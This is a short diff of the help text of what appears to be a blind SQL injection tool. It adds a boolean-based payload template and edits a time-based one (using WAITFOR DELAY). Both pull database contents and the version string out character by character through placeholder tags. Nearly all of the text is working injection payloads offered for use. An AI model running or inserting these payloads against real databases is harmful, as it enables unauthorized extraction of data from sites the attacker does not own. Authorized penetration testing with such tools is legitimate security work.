@@ -27,9 +27,10 @@ In this example, the attacker is looking to select the database
 version:
 
 
+' and ASCII(SUBSTR((SELECT data FROM data LIMIT 1 OFFSET ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} #
 """ + bcolors.RED + """
 vulnerable_parameter'; if(ASCII(SUBSTRING((SELECT @@version LIMIT
-1 OFFSET ${row_index:1}) , ${char_index:1} ,1))) > ASCII(${charval})
+1 OFFSET ${row_index:1}) , ${char_index:1} ,1)))${comparator:>}${char_val:0}
 WAITFOR DELAY '0:0:0${sleep}'; --
 """ + bcolors.ENDC + """
 You need to provide the following tags 
